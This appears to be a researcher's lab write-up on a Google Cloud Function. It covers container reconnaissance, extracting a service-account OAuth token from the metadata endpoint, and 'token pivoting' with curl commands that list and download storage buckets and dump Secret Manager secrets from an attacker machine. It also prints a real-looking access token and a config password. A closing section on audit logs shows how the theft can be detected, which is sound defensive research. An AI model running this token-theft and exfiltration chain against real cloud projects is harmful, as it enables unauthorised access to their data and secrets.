# Google Cloud Platform

## Execution Environment

The container runs as root:

```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Exploring through the filesystem:

```
pwd
/srv/files

ls -la
total 167
drwxr-xr-x 2 root root      0 Jan  3 16:49 .
drwxr-xr-x 2 root root      0 Jan  3 16:49 ..
-rw-r--r-- 1 root root    268 Jan  3 16:49 Makefile
-rw-r--r-- 1 root root   1898 Jan  3 16:49 cheetah.go
-rw-r--r-- 1 root root    178 Jan  3 16:49 cheetah.yaml
-rw-r--r-- 1 root root    170 Jan  3 16:49 go.mod
-rw-r--r-- 1 root root   1798 Jan  3 16:49 go.sum
-rw-r--r-- 1 root root 166598 Jan  3 16:49 package-lock.json
-rw-r--r-- 1 root root    939 Jan  3 16:49 package.json
-rw-r--r-- 1 root root    710 Jan  3 16:49 serverless.yml

ls -al /srv
total 6
drwxr-xr-x 2 root root    0 Dec 24 04:51 .
drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
drwxr-xr-x 2 root root    0 Dec 24 04:51 files
-rw-r--r-- 1 root root  189 Dec 24 04:51 go.mod
-r-xr-xr-x 1 root root   11 Dec 24 04:51 serverless-build.yaml
drwxr-xr-x 2 root root    0 Dec 24 04:51 vendor
-r-xr-xr-x 1 root root 6267 Dec 24 04:51 worker.go
```

`/srv/vendor` appears to contain helper code from Google:

```
ls -al /srv/vendor
total 0
drwxr-xr-x 2 root root 0 Dec 24 04:51 .
drwxr-xr-x 2 root root 0 Dec 24 04:51 ..
drwxr-xr-x 2 root root 0 Dec 24 04:51 gcfeventhelper

ls -al /srv/vendor/gcfeventhelper
total 4
drwxr-xr-x 2 root root    0 Dec 24 04:51 .
drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
-r-xr-xr-x 1 root root 3886 Dec 24 04:51 event.go
-r-xr-xr-x 1 root root   22 Dec 24 04:51 go.mod

cat /srv/vendor/gcfeventhelper/event.go
// Package gcfeventhelper exports a helper function GetMetadataAndDataFromBody that unmarshalls
// an event from supervisor (both legacy and current API) and returns GCF-specific
// metadata and event data.
...
```

```
cat cheetah.yaml
# Server configurations
server:
  host: "10.42.42.42"
  port: 8000

# Database credentials
database:
  user: "cheetah_user"
  pass: "QnV0IHVuaWNvcm5zIGFwcGFyZW50bHkgZG8gZXhpc3Qu"
```

```
cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.2 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

```
echo "test" > test.txt
/bin/sh: 5: cannot create test.txt: Read-only file system
```

```
env
X_GOOGLE_FUNCTION_TIMEOUT_SEC=60
X_GOOGLE_FUNCTION_MEMORY_MB=256
FUNCTION_TIMEOUT_SEC=60
FUNCTION_MEMORY_MB=256
X_GOOGLE_LOAD_ON_START=false
HOME=/root
X_GOOGLE_FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
PORT=8080
ENTRY_POINT=Cheetah
X_GOOGLE_SUPERVISOR_HOSTNAME=169.254.8.129
FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
X_GOOGLE_FUNCTION_NAME=Cheetah
X_GOOGLE_GCLOUD_PROJECT=brandonevans
FUNCTION_NAME=Cheetah
SUPERVISOR_INTERNAL_PORT=8081
X_GOOGLE_GCP_PROJECT=brandonevans
X_GOOGLE_FUNCTION_REGION=us-central1
X_GOOGLE_ENTRY_POINT=Cheetah
FUNCTION_REGION=us-central1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
X_GOOGLE_WORKER_PORT=8091
CODE_LOCATION=/srv
SUPERVISOR_HOSTNAME=169.254.8.129
WORKER_PORT=8091
DEBIAN_FRONTEND=noninteractive
X_GOOGLE_FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
X_GOOGLE_CONTAINER_LOGGING_ENABLED=true
GCLOUD_PROJECT=brandonevans
FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
X_GOOGLE_CODE_LOCATION=/srv
PWD=/srv/files/
GCP_PROJECT=brandonevans
X_GOOGLE_SUPERVISOR_INTERNAL_PORT=8081
X_GOOGLE_FUNCTION_VERSION=2
NODE_ENV=production
```

The supervisor service is could be a point of interest?

```
curl 169.254.8.129:8081
404 page not found
```

## Metadata Endpoint

[App Engine Metadata Service](
https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata#making_metadata_requests)

Querying the service account for interesting bits of information:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

<account-email>@developer.gserviceaccount.com

```

Querying for the default aliases:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases

default
```

Querying for the default service accounts for the execution role:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/

aliases
email
identity
scopes
token
```

Querying the metadata service for the valid scopes. Wow, this is an insane amount of scopes available by default:

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes


https://mail.google.com/
https://www.googleapis.com/auth/analytics
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/contacts
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/presentations
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/streetviewpublish
https://www.googleapis.com/auth/urlshortener
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/youtube

```

Querying the service account authentication token, which appears to be valid for 30 minutes.

```bash
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

{"access_token":"ya29.c.KqUBuAfh01CzhYCWOdbI9m9hx3pObivDuYw6WER2X06r7lB60Biyl8Ur0E-78riuHZa47yqriWSL2fJOZ8CJC6D_F9q6bxun1BE72HnWhuzo_KI43DRj-J60R4fd_vKHQxoQa3rsWEZbfGgH3akYP7aXzJiI29M_0THL6dt74J8Yme3L9-HgLgHWx3gA9q0IACAS7_WZLwcCtSRxZBh","expires_in":1676,"token_type":"Bearer"}
```

## Token Pivoting

At the time of this writing, I have not found a way to load up the OAuth access token and use it from the `gcloud` command line interface. This overall makes it harder to run commands against the account, but can still be done directly against the API using a proxy tool, Burp, or by using the SDK from a script (Python, Java, .NET, etc.).

Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.

```bash
export GOOGLE_TOKEN=<INSERT ACCESS TOKEN>
export GOOGLE_PROJECT=<GOOGLE PROJECT>
```

TODO: Write a bucket exfiltration script to do the following for us for all buckets and all items in the project. See the [Cloud Storage JSON API](https://cloud.google.com/storage/docs/json_api/) for details.

List the buckets for the project and query the first bucket:

```bash
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
```

List the objects in the storage bucket

```bash
export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
```

Download the object from the bucket:

```bash
export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
```

At the time of this writing, the secrets manager appears to still be in Beta. See the [API Reference](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets) for details on accessing the API. List the secrets in the project:

```bash
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
```

Dump the secret value:

```bash
export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
```

By default this returns a *403* from the service account running the function:

```json
{
  "error": {
    "code": 403,
    "message": "Permission 'secretmanager.versions.access' denied for resource 'projects/123/secrets/cheetah-database-pass/versions/1' (or it may not exist).",
    "status": "PERMISSION_DENIED"
  }
}
```

It appears this is not included the default editor role permissions. You have to explicitly grant the service account the Secret Manager Secret Accessor (secretmanager.versions.access) permission to view the secret value. Then, running the command returns the following:


```bash
curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access

{
  "name": "projects/123/secrets/cheetah-database-pass/versions/1",
  "payload": {
    "data": "UW5WMElIVnVhV052Y201eklHRndjR0Z5Wlc1MGJIa2daRzhnWlhocGMzUXU="
  }
}
```

## Persistence

Persisting a malware payload into the runtime environment:

```
echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /tmp/malware.sh
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```
cat /tmp/malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 3 minutes:

cat /tmp/malware.sh
cat: /tmp/malware.sh: No such file or directory

## Monitoring &amp; Incident Response

See the [Cloud Functions Monitoring](https://cloud.google.com/functions/docs/monitoring/) documents for details.

Stackdriver services captures and stores function logs, error reporting, and records metrics. The Stackdriver GUI is (surprise) in beta at the time of this writing.

Instrumenting the function with audit logging statements, such as follows will write logs to the Stackdriver Logging service.

### Cloud Audit

- Head to the IAM Audit Logs service. Enable admin and data logging. This can be global, or by service. Then, you'll get audit data for API calls.

- Invoke Cheetah to cause **normal** behavior.

- Stackdriver is the log viewer that will allow you to see the normal activity versus malicious activity.

  - In the log dropdown, selected Audited Resources

  - Start searching for the log files for **Secret Manager** **AccessSecretVersion** calls. You should find a log entry similar to the following:

      ```json
      {
        insertId: "suvz8ge1dkpo"  
        logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
        protoPayload: {
          @type: "type.googleapis.com/google.cloud.audit.AuditLog"
          authenticationInfo: {
          principalEmail: "123456789012-compute@developer.gserviceaccount.com"
          principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
          }
          authorizationInfo: [
          0: {
            granted: true
            permission: "secretmanager.versions.access"
            resourceAttributes: {
            }
          }
          ]
          methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
          request: {
          @type: "type.googleapis.com/google.cloud.secrets.v1beta1.AccessSecretVersionRequest"
          name: "projects/google-project-id/secrets/cheetah-database-pass/versions/latest"
          }
          requestMetadata: {
            callerIp: "2600:1900:2000:38:400::13"
            callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
            destinationAttributes: {
          }
          requestAttributes: {
            auth: {
            }
            time: "2020-01-09T23:55:02.888841562Z"
          }
          }
          resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
          serviceName: "secretmanager.googleapis.com"
        }
        receiveTimestamp: "2020-01-09T23:55:03.543549591Z"  
        resource: {
          labels: {
          method: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
          project_id: "google-project-id"
          service: "secretmanager.googleapis.com"
          }
          type: "audited_resource"
        }
        severity: "INFO"  
        timestamp: "2020-01-09T23:55:02.882192620Z"  
      }
      ```

  - Notice the user account is the function service account and request metadata from inside the platform infrastructure:

    ```json
    principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
    ```

    ```json
    requestMetadata: {
          callerIp: "2600:1900:2000:38:400::13"
          callerSuppliedUserAgent: "grpc-go/1.26.0,gzip(gfe),gzip(gfe)"
          ...
    }
    ```

- Replay the above **Token Pivoting** attack, extracting the auth token from the function, and dumping the secret from your attack machine.

- Search the Stackdriver logs again. Notice this new malicious log entry. Same user account, except not coming from the Go GRPC package. This time from curl and from a different (non-IPv6) address:

  ```json
  {
    insertId: "1d4dg1pd50ae"  
    logName: "projects/google-project-id/logs/cloudaudit.googleapis.com%2Fdata_access"  
    protoPayload: {
      @type: "type.googleapis.com/google.cloud.audit.AuditLog"
      authenticationInfo: {
      principalEmail: "123456789012-compute@developer.gserviceaccount.com"
      principalSubject: "user:123456789012-compute@developer.gserviceaccount.com"
      }
      authorizationInfo: [1]
      methodName: "google.cloud.secrets.v1beta1.SecretManagerService.AccessSecretVersion"
      request: {…}
      requestMetadata: {
        callerIp: "95.025.143.109"
        callerSuppliedUserAgent: "curl/7.64.1,gzip(gfe),gzip(gfe)"
        destinationAttributes: {…}
        requestAttributes: {…}
      }
      resourceName: "projects/123456789012/secrets/cheetah-database-pass/versions/latest"
      serviceName: "secretmanager.googleapis.com"
    }
    receiveTimestamp: "2020-01-10T20:30:00.403050477Z"  
    resource: {…}  
    severity: "INFO"  
    timestamp: "2020-01-10T20:30:00.192825193Z"
  }
  ```

- For whats it's worth, this anomaly is not detected by the **Security Command Center** threat detection or anomaly detection rules.

## VPC Configuration

Attempted this in the Web UI. Crashed...

### VPC Endpoints

Unable to configure this due to the error connecting the function to a VPC network interface.

## Cold Start Times

Running the following command a few times to see the cold versus warm start metrics. This will invoke the function without any reverse shell data (simulating starting and stopping the function), and retrieve the response time.

```bash
curl "http://$GCP_REGION-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah" -s -o /dev/null -w "%{time_starttransfer}\n"
```

### No VPC Integration

Cold to warm metrics:

```
Request 1: 2.730960
Request 2: 0.504486
Request 3: 0.464685
Request 4: 0.531443
```

### With VPC Integration

Unable to test due to the configuration error above.
